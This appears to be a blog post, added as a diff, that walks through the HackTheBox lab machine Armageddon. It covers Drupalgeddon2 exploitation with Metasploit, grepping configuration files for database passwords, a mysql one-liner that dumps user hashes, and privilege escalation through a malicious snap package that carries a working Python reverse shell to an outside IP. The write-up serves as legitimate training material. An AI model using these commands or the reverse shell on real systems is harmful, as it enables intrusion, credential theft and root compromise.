@@ -1,0 +1,232 @@
+---
+title: HackTheBox Armageddon Write Up
+description: >-
+  My writeup for Armageddon, a linux based machine rated as easy on HackTheBox
+  platform.
+pubDate: 2021-07-26
+categName: hack-the-box
+tagList: htb,linux,drupal,snap
+author: thewhiteh4t
+cardImage: ../../assets/post_imgs/htb-armageddon-writeup/cardImage.jpg
+---
+```
+---------------------------------
+--- Name       : Armageddon -----
+--- IP         : 10.10.10.223 ---
+--- Platform   : Linux ----------
+--- Difficulty : Easy -----------
+---------------------------------
+```
+
+Armageddon covers Drupal exploitation for foothold and malicious snap packages for privilege escalation.
+
+## Reconnaissance
+
+Fast 1000 port scan using FinalRecon
+
+```bash
+$ finalrecon --ps http://10.10.10.233
+
+[+] Checking Dependencies...
+
+ ______  __   __   __   ______   __
+/\  ___\/\ \ /\ "-.\ \ /\  __ \ /\ \
+\ \  __\\ \ \\ \ \-.  \\ \  __ \\ \ \____
+ \ \_\   \ \_\\ \_\\"\_\\ \_\ \_\\ \_____\
+  \/_/    \/_/ \/_/ \/_/ \/_/\/_/ \/_____/
+ ______   ______   ______   ______   __   __
+/\  == \ /\  ___\ /\  ___\ /\  __ \ /\ "-.\ \
+\ \  __< \ \  __\ \ \ \____\ \ \/\ \\ \ \-.  \
+ \ \_\ \_\\ \_____\\ \_____\\ \_____\\ \_\\"\_\
+  \/_/ /_/ \/_____/ \/_____/ \/_____/ \/_/ \/_/
+
+[>] Created By : thewhiteh4t
+ |---> Twitter : https://twitter.com/thewhiteh4t
+ |---> Discord : https://discord.gg/UM92zUn
+[>] Version    : 1.1.2
+
+[+] Checking for Updates...[ Up-To-Date ]
+
+[+] Target : http://10.10.10.233
+
+[!] Starting Port Scan...
+
+[+] Testing Top 1000 Ports...
+
+[+] 22     ssh
+[+] 80     http
+
+[+] Completed in 0:00:01.582929
+```
+
+On port 80 we have a login page, after directory enumeration I discovered the following paths...
+
+```
+http://10.10.10.233/profiles
+http://10.10.10.233/profiles/minimal/minimal.info
+```
+
+## Intrusion
+
+In the second URL i found that drupal is being used and its version is 7.56 . This version is vulnerable to Drupalgeddon attack. To exploit this vulnerability I used MSF module...
+
+```
+unix/webapp/drupal_drupalgeddon2
+```
+
+Drupalgeddon2 is an unauthenticated exploit, below you can see the options I used in the MSF module
+
+![](https://i.imgur.com/sZC5cci.png)
+
+![](https://i.imgur.com/yerpIO5.png)
+
+## Enumeration
+
+To make things easier and faster I dropped to a shell...
+
+```bash
+whoami
+apache
+
+pwd
+/var/www/html
+
+ls -l
+total 268
+-rw-r--r--.  1 apache apache 111613 Jun 21  2017 CHANGELOG.txt
+-rw-r--r--.  1 apache apache   1481 Jun 21  2017 COPYRIGHT.txt
+-rw-r--r--.  1 apache apache   1717 Jun 21  2017 INSTALL.mysql.txt
+-rw-r--r--.  1 apache apache   1874 Jun 21  2017 INSTALL.pgsql.txt
+-rw-r--r--.  1 apache apache   1298 Jun 21  2017 INSTALL.sqlite.txt
+-rw-r--r--.  1 apache apache  17995 Jun 21  2017 INSTALL.txt
+-rw-r--r--.  1 apache apache  18092 Nov 16  2016 LICENSE.txt
+-rw-r--r--.  1 apache apache   8710 Jun 21  2017 MAINTAINERS.txt
+-rw-r--r--.  1 apache apache   5382 Jun 21  2017 README.txt
+-rw-r--r--.  1 apache apache  10123 Jun 21  2017 UPGRADE.txt
+-rw-r--r--.  1 apache apache   6604 Jun 21  2017 authorize.php
+-rw-r--r--.  1 apache apache    720 Jun 21  2017 cron.php
+drwxr-xr-x.  4 apache apache   4096 Jun 21  2017 includes
+-rw-r--r--.  1 apache apache    529 Jun 21  2017 index.php
+-rw-r--r--.  1 apache apache    703 Jun 21  2017 install.php
+drwxr-xr-x.  4 apache apache   4096 Dec  4  2020 misc
+drwxr-xr-x. 42 apache apache   4096 Jun 21  2017 modules
+drwxr-xr-x.  5 apache apache     70 Jun 21  2017 profiles
+-rw-r--r--.  1 apache apache   2189 Jun 21  2017 robots.txt
+drwxr-xr-x.  2 apache apache    261 Jun 21  2017 scripts
+-rw-r--r--.  1 apache apache     75 Jul 26 12:14 shell.php
+drwxr-xr-x.  4 apache apache     75 Jun 21  2017 sites
+drwxr-xr-x.  7 apache apache     94 Jun 21  2017 themes
+-rw-r--r--.  1 apache apache  19986 Jun 21  2017 update.php
+-rw-r--r--.  1 apache apache   2200 Jun 21  2017 web.config
+-rw-r--r--.  1 apache apache    417 Jun 21  2017 xmlrpc.php
+```
+
+I landed directly in default apache directory, as we know PHP files can contain database credentials I ran recursive grep in the current directory
+
+```bash
+grep -rnw "password"
+```
+
+I got lots of matches and one of the files contains a password
+
+![](https://i.imgur.com/mYKl9Fi.png)
+
+```php
+$databases = array (
+  'default' =>
+  array (
+    'default' =>
+    array (
+      'database' => 'drupal',
+      'username' => 'drupaluser',
+      'password' => 'CQHEy@9M*m23gBVj',
+      'host' => 'localhost',
+      'port' => '',
+      'driver' => 'mysql',
+      'prefix' => '',
+    ),
+  ),
+);
+```
+
+Along with the password I found database name and username. Driver field contains mysql so I tried to login. Below is a nice one liner you can use to automatically login and get content of tables without getting into mysql shell, this is very useful in cases where you don't have a full tty reverse shell because mysql shell can mess things up and its hard to get out without breaking the entire reverse connection
+
+```bash
+mysql --user="drupaluser" --password="CQHEy@9M*m23gBVj" --database="drupal" --execute="select * from users;"
+```
+
+![](https://i.imgur.com/vBl6atE.png)
+
+```
+username : brucetherealadmin
+hash : $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt
+---
+password after cracking : booboo
+```
+
+these credentials worked for SSH login and I got a proper shell along with the user flag
+
+![](https://i.imgur.com/k9Gt1O7.png)
+
+## Privilege Escalation
+
+In every linux box the first thing I try is the following command...
+
+```bash
+[brucetherealadmin@armageddon ~]$ sudo -l
+Matching Defaults entries for brucetherealadmin on armageddon:
+    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
+    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
+    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
+    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
+    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
+    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
+    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin
+
+User brucetherealadmin may run the following commands on armageddon:
+    (root) NOPASSWD: /usr/bin/snap install *
+```
+
+so our user can execute snap install using sudo without a password. At this point I started researching on how to create my own malicious snap package.
+
+First I found this awesome tutorial by ubuntu on creating essential files required for the snap package :
+
+[https://ubuntu.com/tutorials/create-your-first-snap#3-building-a-snap-is-easy](https://ubuntu.com/tutorials/create-your-first-snap#3-building-a-snap-is-easy)
+
+```yaml
+$ cat snapcraft.yaml
+name: twh
+base: core
+version: '1.0'
+summary: summary
+description: |
+  Brief description
+```
+
+After this I started looking for ways to execute system commands from within the snap package and found the following snapcraft forum thread where a similar situation had been discussed :
+
+[https://forum.snapcraft.io/t/making-snap-of-a-bash-script/16486/12](https://forum.snapcraft.io/t/making-snap-of-a-bash-script/16486/12)
+
+here is the final snapcraft.yaml file :
+
+![](https://i.imgur.com/4u1iqpi.png)
+
+the rev.sh you see above contains the following python reverse shell...
+
+```bash
+$cat rev.sh
+
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.19",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
+```
+
+In this process I also discovered a part of documentation which really helped in making sense of almost everything snap related :
+
+Finally after running snapcraft command as mentioned in the guide by ubuntu I successfully built a malicious snap package
+
+![](https://i.imgur.com/O1kWtq4.png)
+
+After uploading the malicious snap package to the target I used the install command we saw earlier but since the confinement in yaml file is defined as devmode I used the devmode option...
+
+![](https://i.imgur.com/xldHKZt.png)
+
+Solved.
